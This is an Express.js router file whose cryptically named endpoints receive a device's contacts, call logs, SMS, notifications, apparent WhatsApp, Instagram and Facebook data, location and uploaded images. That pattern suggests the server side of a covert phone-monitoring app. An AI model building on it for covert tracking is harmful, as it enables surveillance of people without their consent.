const express = require('express')
const userController = require('../Controllers/user.controller')
const verifyToken = require('../middleware/auth')
const bodyParser = require('body-parser')

console.log('router call');

const router = express.Router()
// app.use(bodyParser.json())
// app.use(
//     bodyParser.urlencoded({
//         extended: true,
//     })
// )
router.post('/register', userController.user_register)

router.post('/esign', userController.user_login)

router.post('/edvulst', verifyToken, userController.device_list)

router.post('/ecntctudtls', verifyToken, userController.contact_list);

router.post('/ecludtls', verifyToken, userController.call_details);

router.post('/esmsudtls', verifyToken, userController.sms_details);

router.post('/ealnoti', verifyToken, userController.notification);

router.post('/ealwp', verifyToken, userController.ealwp);

router.post('/ealins', verifyToken, userController.ealins);

router.post('/ealfb', verifyToken, userController.ealfb);

router.post('/enstl', verifyToken, userController.uninstall);

router.post('/elcutn', verifyToken, userController.location);

router.post('/emiudea', verifyToken, userController.upload_img);

module.exports = router;